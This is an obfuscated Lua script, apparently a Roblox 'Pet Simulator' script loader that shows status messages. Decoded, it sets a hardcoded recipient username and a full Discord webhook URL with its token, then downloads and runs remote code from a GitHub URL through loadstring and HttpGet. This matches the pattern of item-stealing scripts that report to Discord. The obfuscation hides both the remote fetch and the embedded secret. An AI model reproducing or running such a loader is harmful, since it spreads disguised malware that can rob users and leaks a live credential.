do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then v19=v0(v3(v20,1,1));return "";else local v74=v2(v0(v20,16));if v19 then local v80=v5(v74,v19);v19=nil;return v80;else return v74;end end end);local function v21(v22,v23,v24)if v24 then local v75=(v22/(2^(v23-(1886 -(1289 + 596)))))%((4 -2)^(((v24-(1 + (1680 -(1398 + 282)))) -(v23-1)) + 1 + 0)) ;return v75-(v75%(1 + 0)) ;else local v76=0 + 0 ;local v77;while true do if (v76==0) then v77=(1 + 1)^(v23-(1 -0)) ;return (((v22%(v77 + v77))>=v77) and 1) or (0 + 0) ;end end end end local function v25()local v38=0;local v39;while true do if (v38==(773 -(463 + 310))) then v39=v1(v16,v18,v18);v18=v18 + 1 + 0 ;v38=1 + 0 ;end if (v38==(1 -(941 -(557 + 384)))) then return v39;end end end local function v26()local v40,v41=v1(v16,v18,v18 + (2 -0) );v18=v18 + (2 -0) ;return (v41 * (862 -(275 + 331))) + v40 ;end local function v27()local v42,v43,v44,v45=v1(v16,v18,v18 + 1 + 2 );v18=v18 + 4 ;return (v45 * (56136437 -39359221)) + (v44 * (48937 + 16599)) + (v43 * (700 -444)) + v42 ;end local function v28()local v46=944 -(147 + 797) ;local v47;local v48;local v49;local v50;local v51;local v52;while true do if (v46==(495 -(273 + 222))) then v47=v27();v48=v27();v46=1975 -(1229 + 85 + 660) ;end if (v46==(1 + 2)) then if (v51==0) then if (v50==(772 -(338 + (2068 -(585 + 1049))))) then return v52 * (459 -((2146 -(1276 + 574)) + 163)) ;else v51=925 -(694 + 230) ;v49=0 + 0 ;end elseif (v51==(363 + 438 + 1246)) then return ((v50==(392 -(89 + 303))) and (v52 * ((4 -3)/0))) or (v52 * NaN) ;end return v8(v52,v51-1023 ) * (v49 + (v50/((5 -3)^(826 -(525 + 249))))) ;end if (v46==(4 -3)) then v49=1 -0 ;v50=(v21(v48,1 -0 ,(1123 -(267 + 188)) -(468 + 180) ) * ((1 + 1)^(2 + 30))) + v47 ;v46=2;end if (2==v46) then v51=v21(v48,1389 -(681 + 687) ,82 -51 );v52=((v21(v48,47 -15 )==(2 -(1 -0))) and  -(2 -(1 + 0))) or 1 ;v46=1946 -(1117 + (1983 -(427 + 730))) ;end end end local function v29(v30)local v53;if  not v30 then v30=v27();if (v30==(0 -0)) then return "";end end v53=v3(v16,v18,(v18 + v30) -(4 -3) );v18=v18 + v30 ;local v54={};for v66=1029 -(354 + 674) , #v53 do v54[v66]=v2(v1(v3(v53,v66,v66)));end return v6(v54);end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v55=0 -0 ;local v56;local v57;local v58;local v59;local v60;local v61;local v62;while true do if ((1 + 0)==v55) then local v78=332 -(63 + 269) ;while true do if ((1674 -(283 + 1390))==v78) then v55=2;break;end if (v78~=(0 + 0)) then else v58=nil;v59=nil;v78=3 -2 ;end end end if (v55==(2 + 0)) then v60=nil;v61=nil;v55=2 + 1 ;end if (v55~=(4 -1)) then else v62=nil;while true do local v81=1358 -(1198 + 160) ;while true do if (v81~=0) then else if (v56~=(738 -(682 + 53))) then else for v106=564 -(26 + 537) ,v27() do v58[v106-1 ]=v33();end for v108=1944 -(1076 + 867) ,v27() do v59[v108]=v27();end return v60;end if (v56~=(0 -0)) then else local v100=0 -0 ;local v101;while true do if (v100==(751 -(496 + 255))) then v101=993 -(354 + 639) ;while true do if ((1788 -(74 + 1713))~=v101) then else v59={};v56=1 + 0 ;break;end if ((1857 -(690 + 1167))~=v101) then else v57={};v58={};v101=1 -0 ;end end break;end end end v81=1 + 0 ;end if ((1 + 0)==v81) then if (v56~=(314 -(66 + 247))) then else local v102=0;local v103;while true do if (0==v102) then v103=0;while true do if (v103==(4 -3)) then v62={};v56=2;break;end if (v103==(0 -0)) then v60={v57,v58,nil,v59};v61=v27();v103=1 + 0 ;end end break;end end end if (v56==(1301 -(660 + 639))) then local v104=0 + 0 ;local v105;while true do if (0==v104) then v105=0 + 0 ;while true do if ((0 + 0)~=v105) then else for v113=2 -1 ,v61 do local v114=1905 -(1839 + 66) ;local v115;local v116;local v117;local v118;while true do if (v114~=(2 -1)) then else v117=nil;v118=nil;v114=2;end if (v114~=0) then else v115=0 + 0 ;v116=nil;v114=1;end if (v114~=(1 + 1)) then else while true do if (v115==(0 -0)) then local v146=0 -0 ;while true do if (0==v146) then local v162=0;while true do if (v162==1) then v146=1 -0 ;break;end if (v162~=(0 + 0)) then else v116=0 -0 ;v117=nil;v162=1208 -(959 + 248) ;end end end if ((1 + 0)~=v146) then else v115=1615 -(311 + 1303) ;break;end end end if (v115==(488 -(280 + 207))) then v118=nil;while true do if (v116==(1933 -(161 + 1771))) then if (v117==(1820 -(1255 + 564))) then v118=v25()~=(0 + 0) ;elseif (v117==2) then v118=v28();elseif (v117~=(987 -(506 + 478))) then else v118=v29();end v62[v113]=v118;break;end if (v116==(0 + 0)) then local v164=989 -(292 + 697) ;local v165;while true do if (v164~=(618 -(552 + 66))) then else v165=1813 -(1528 + 285) ;while true do if (v165==(1332 -(186 + 1146))) then local v177=0 -0 ;while true do if (v177~=(0 + 0)) then else v117=v25();v118=nil;v177=1727 -(1044 + 682) ;end if (v177==1) then v165=1347 -(929 + 417) ;break;end end end if (v165~=(1 + 0)) then else v116=1;break;end end break;end end end end break;end end break;end end end v60[2 + 1 ]=v25();v105=1;end if (v105~=(1 -0)) then else for v119=1 + 0 ,v27() do local v120=0 -0 ;local v121;local v122;while true do if (v120~=(2 -1)) then else while true do if (v121==0) then v122=v25();if (v21(v122,1 + 0 ,1)~=(0 -0)) then else local v153=1224 -(908 + 316) ;local v154;local v155;local v156;local v157;local v158;while true do if (v153==1) then v156=nil;v157=nil;v153=2;end if (v153==(921 -(517 + 402))) then v158=nil;while true do if (v154~=(2 -1)) then else local v175=0 -0 ;while true do if (v175==(1016 -(274 + 742))) then v157=nil;v158=nil;v175=2 -1 ;end if ((2 -1)==v175) then v154=899 -(518 + 379) ;break;end end end if (v154~=(1 + 1)) then else while true do if (v155==(1946 -(1247 + 698))) then local v178=0;local v179;while true do if ((0 + 0)~=v178) then else v179=0 -0 ;while true do if (v179==(0 + 0)) then v158={v26(),v26(),nil,nil};if (v156==(1394 -(150 + 1244))) then local v190=0 -0 ;local v191;while true do if (v190~=0) then else v191=969 -(69 + 900) ;while true do if (v191==(121 -(66 + 55))) then v158[4 -1 ]=v26();v158[6 -2 ]=v26();break;end end break;end end elseif (v156==(1 + 0)) then v158[1811 -(20 + 1788) ]=v27();elseif (v156==(2 + 0)) then v158[3]=v27() -((3 -1)^(77 -61)) ;elseif (v156==3) then local v196=0;local v197;local v198;while true do if ((0 + 0)==v196) then v197=1624 -(189 + 1435) ;v198=nil;v196=1;end if ((1 + 0)==v196) then while true do if ((0 + 0)==v197) then v198=0 -0 ;while true do if (v198~=(0 -0)) then else v158[1905 -(852 + 1050) ]=v27() -((820 -(776 + 42))^(14 + 2)) ;v158[4]=v26();break;end end break;end end break;end end end v179=1;end if (v179==1) then v155=1024 -(54 + 968) ;break;end end break;end end end if (v155==(9 -6)) then if (v21(v157,6 -3 ,10 -7 )~=(171 -(42 + 128))) then else v158[5 -1 ]=v62[v158[382 -(62 + 316) ]];end v57[v119]=v158;break;end if (v155==(993 -(522 + 471))) then v156=v21(v122,2,695 -(42 + 650) );v157=v21(v122,1 + 3 ,562 -(64 + 492) );v155=2 -1 ;end if (v155~=(2 -0)) then else local v181=1459 -(996 + 463) ;while true do if (v181~=0) then else if (v21(v157,1 + 0 ,1 + 0 )==(1 + 0)) then v158[2 + 0 ]=v62[v158[2 + 0 ]];end if (v21(v157,1269 -(756 + 511) ,486 -(250 + 234) )==(2 -1)) then v158[3]=v62[v158[3]];end v181=1;end if (v181~=(1 + 0)) then else v155=1593 -(1211 + 379) ;break;end end end end break;end if (v154==(0 + 0)) then local v176=623 -(170 + 453) ;while true do if (v176==1) then v154=1 + 0 ;break;end if (v176~=(378 -(260 + 118))) then else v155=0 + 0 ;v156=nil;v176=2 -1 ;end end end end break;end if (v153~=(1512 -(703 + 809))) then else v154=0;v155=nil;v153=1 + 0 ;end end end break;end end break;end if (v120~=(0 -0)) then else local v136=0;while true do if (v136~=0) then else v121=0 -0 ;v122=nil;v136=2 -1 ;end if (v136==1) then v120=1 + 0 ;break;end end end end end v56=5 -2 ;break;end end break;end end end break;end end end break;end if (0~=v55) then else local v79=0 -0 ;while true do if (0~=v79) then else v56=0 + 0 ;v57=nil;v79=1;end if (v79~=1) then else v55=1422 -(545 + 876) ;break;end end end end end local function v34(v35,v36,v37)local v63=v35[1];local v64=v35[2];local v65=v35[3];return function(...)local v68=0;local v69;local v70;local v71;local v72;local v73;while true do if (v68==3) then A,B=v32(v11(v73));if  not A[1] then local v92=v35[4][v69] or "?" ;error("Script error at ["   .. v92   .. "]:"   .. A[2] );else return v13(A,2,B);end break;end if (v68==2) then v73=nil;v73=function()local v82=v63;local v83=v64;local v84=v65;local v85=v32;local v86={};local v87={};local v88={};for v93=0 + 0 ,v72 do if ((v93>=v84) or ((4467 -((1568 -665) + 76))<=(2014 + 466))) then v86[v93-v84 ]=v71[v93 + 1 ];else v88[v93]=v71[v93 + 1 + (1798 -(125 + 1673)) ];end end local v89=(v72-v84) + ((642 -(96 + 147)) -(173 + 1 + 224)) ;local v90;local v91;while true do local v94=0 + 0 ;local v95;while true do if ((3802>=(2596 -1016)) and (v94==(0 + 0))) then v95=0;while true do if ((v95==(1 + 0)) or (3645>=((11178 -(375 + 1585)) -5468))) then if (((2100 + 1325)==((8038 -(720 + 803)) -3090)) and (v91<=(3 + 2))) then if ((v91<=(9 -7)) or (2042>=4899)) then if (((184 + 181)<=(1250 + 1739)) and (v91<=(0 -0))) then local v123=0;local v124;local v125;local v126;local v127;local v128;while true do if ((((1192 + 1889) -1573)==1508) and (v123==(0 + 0))) then v124=0 + 0 ;v125=nil;v123=1 -0 ;end if ((v123==2) or ((1754 + 3137)<369)) then v128=nil;while true do if (((1190 + 539)==(567 + (2430 -1268))) and (v124==1)) then local v159=0 -0 ;while true do if ((v159==(398 -(380 + 18))) or ((1509 + 2311)<(739 + 1531))) then v70=(v127 + v125) -(1085 -(233 + 851)) ;v128=0 + 0 + 0 ;v159=1 + 0 ;end if (((1694 -(1607 + 86))==v159) or ((4810 -3487)>(7809 -5167))) then v124=6 -(6 -2) ;break;end end end if ((v124==2) or ((7111 -4666)>(3270 + 1600))) then for v166=v125,v70 do local v167=0 -0 ;local v168;local v169;while true do if (((7738 -3544)>=(3718 -1287)) and (v167==(1 -0))) then while true do if ((((604 + 3700) -(3878 -(653 + 602)))<=((6592 -2692) -(229 + 35))) and (v168==((2151 -(14 + 546)) -(306 + 1240 + 45)))) then v169=419 -(99 + 320) ;while true do if ((v169==0) or (745>(3473 -(330 + 306)))) then v128=v128 + (1996 -(1665 + 330)) ;v88[v166]=v126[v128];break;end end break;end end break;end if ((v167==(0 + 0)) or ((99 + 201)==(4005 -2387))) then v168=1835 -(1523 + 312) ;v169=nil;v167=958 -(291 + 666) ;end end end break;end if ((v124==0) or ((7365 -5471)<=141)) then local v160=0;while true do if (((2196 -(378 + 906))<(1010 + 1776)) and ((1188 -(1107 + 81))==v160)) then v125=v90[7 -5 ];v126,v127=v85(v88[v125](v13(v88,v125 + (1554 -(1258 + 295)) ,v90[3])));v160=(2 -1) -0 ;end if (((2155 -(239 + (2680 -(358 + 1076))))<=(1064 + 1810 + 1646)) and ((1412 -((681 -(454 + 69)) + 1253))==v160)) then v124=(1421 -(767 + 653)) + 0 ;break;end end end end break;end if ((v123==(2 -1)) or ((1407 -(21 + 2))>(976 + 1447))) then v126=nil;v127=nil;v123=2;end end elseif (((2451 -(159 + 50))<(4444 -(760 + 997))) and (v91>(508 -(180 + 327)))) then v88[v90[2]][v90[8 -5 ]]=v90[(105 -(69 + 32)) + 0 ];else local v139=0;local v140;local v141;while true do if (((4211 + 268)>(11950 -(12763 -3600))) and (v139==(1731 -(890 + 841)))) then local v149=(0 + 0) -0 ;while true do if ((v149==0) or ((4496 -((225 -153) + 281))<=(396 + 2657))) then v140=v90[1 + 1 ];v141=v88[v90[3 + 0 ]];v149=1;end if (((802 + 2800)>2917) and (v149==(1658 -(220 + 1073 + 364)))) then v139=(63 -(37 + 25)) + 0 ;break;end end end if ((((558 + 550) -(608 + 112))<=(5891 -(778 + 481))) and (v139==(1 -0))) then v88[v140 + 1 ]=v141;v88[v140]=v141[v90[4 -0 ]];break;end end end elseif ((v91<=(868 -(42 + 823))) or ((8499 -6533)<=(560 -319))) then v37[v90[1625 -(790 + 832) ]]=v88[v90[1 + 0 + 1 ]];elseif (((378 + 557)==(2245 -1310)) and (v91==(1276 -(170 + 1102)))) then v88[v90[460 -(393 + 65) ]]=v37[v90[5 -2 ]];else v88[v90[2]]=v90[1 + 2 ];end elseif ((v91<=8) or ((52 + 4310)>=(16203 -(5093 + 6269)))) then if (((758 + 2357)==(6908 -3793)) and (v91<=(893 -(380 + 507)))) then v69=v90[3];elseif ((v91>7) or (3350<(3334 -1351))) then if ((270<(1490 -(71 + 126))) and (v88[v90[2]]==v90[9 -5 ])) then v69=v69 + ((297 + 468) -(265 + 499)) ;else v69=v90[686 -(326 + 357) ];end elseif (((9880 -6281)>(460 + 179)) and (v90[1495 -(1291 + 202) ]==v88[v90[4]])) then v69=v69 + (1 -0) ;else v69=v90[3 + 0 ];end elseif ((v91<=9) or ((1119 + 97)>(8493 -(16733 -13005)))) then local v132=0;local v133;local v134;local v135;while true do if (((3072 -(40 + 303))>(1162 -(48 + 897))) and (v132==(1866 -(228 + (2733 -(832 + 264)))))) then v135=nil;while true do if ((v133==0) or (1882==(4304 -1920))) then local v161=0 -0 ;while true do if ((v161==(36 -(22 + 14))) or ((3789 -1208)<((210 + 916) -(356 + 148)))) then v134=0 -0 ;v135=nil;v161=1288 -(1072 + 215) ;end if (((2 -1)==v161) or ((6879 -5210)>=4716)) then v133=1 + 0 ;break;end end end if (((3250 -(1109 + 743))<=(4200 -(165 + 1576))) and (v133==1)) then while true do if (((3599 + 1153)==(7647 -(2707 + 188))) and ((0 -0)==v134)) then v135=v90[2 -0 ];v88[v135]=v88[v135](v13(v88,v135 + 1 ,v70));break;end end break;end end break;end if ((v132==(0 -(0 -0))) or ((1017 -623)>(9698 -6528))) then v133=0 + 0 ;v134=nil;v132=2 -1 ;end end elseif ((v91>(1126 -(1000 + 116))) or ((423 + 320 + 9)>(2193 + 293 + 1892))) then v88[v90[491 -(343 + 146) ]]();else do return;end end v69=v69 + (667 -(264 + 402)) ;break;end if (((7960 -4604)>=((3593 -(216 + 203)) + 84)) and (v95==(1894 -(106 + 1788)))) then v90=v82[v69];v91=v90[3 -2 ];v95=1;end end break;end end end end;v68=3;end if (v68==1) then v71={...};v72=v12("#",...) -1 ;v68=2;end if (v68==0) then v69=1;v70= -1;v68=1;end end end;end return v34(v33(),{},v17)(...);end v15("LOL!173O00028O00026O00F03F03023O005F4703103O00437573746F6D5363726970744E616D6503043O00436F656E03053O00546578743103103O00536372697074204C6F616465643O2E027O004003053O00546578743203123O0057616974696E6720666F722053637269707403053O00546578743303133O00436865636B696E6720536372697074733O2E026O00084003053O00546578743403133O005374617274696E6720536372697074733O2E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C756103083O00557365726E616D65030B3O006D61726B6F6C697361633203073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130383230332O3539313931323337383437382F5574597A6169505F52327A39665765485238427866334F2D48434E4B6643707436444976585279392D516274717A317267447643456553654C7744745A7A343134496C6300243O0012053O00013O0026083O0008000100020004063O00080001001204000100033O003002000100040005001204000100033O0030020001000600070012053O00083O000E070008000F00013O0004063O000F0001001204000100033O00300200010009000A001204000100033O0030020001000B000C0012053O000D3O0026083O001B0001000D0004063O001B0001001204000100033O0030020001000E000F001204000100103O001204000200113O002001000200020012001205000400136O000200044O000900013O00022O000B0001000100010004063O00230001000E070001000100013O0004063O00010001001205000100153O001203000100143O001205000100173O001203000100163O0012053O00023O0004063O000100012O000A3O00017O00243O00023O00043O00043O00053O00053O00063O00063O00073O00093O00093O000A3O000A3O000B3O000B3O000C3O000E3O000E3O000F3O000F3O00103O00103O00103O00103O00103O00103O00103O00113O00133O00133O00143O00143O00153O00153O00163O00173O00193O00",v9(),...);end
